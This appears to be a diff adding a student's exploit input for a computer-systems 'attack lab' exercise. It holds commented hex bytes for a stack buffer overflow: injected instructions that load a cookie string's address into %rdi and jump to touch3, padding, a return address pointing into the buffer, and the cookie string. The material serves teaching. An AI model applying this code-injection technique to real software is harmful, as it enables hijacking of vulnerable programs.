@@ -1,0 +1,19 @@
+/* fill the array */
+48 c7 c7 /* write to %rdi */
+a8 dc 61 55 /* the address of string cookie */
+68 fa 18 40 /* pushq the address of touch3 */
+00 c3 00 00 /* ret */
+00
+00 00 00 00
+00 00 00 00
+00 00 00 00
+00 00 00 00
+00 00 00 00
+00 00 00 00
+
+78 dc 61 55 /* the start of array */
+00 00 00 00    
+/* when ret, %rsp will add and read 8 bytes , so that fill 00 00 00 00 */
+
+35 39 62 39    /* the string format of cookie */
+39 37 66 61
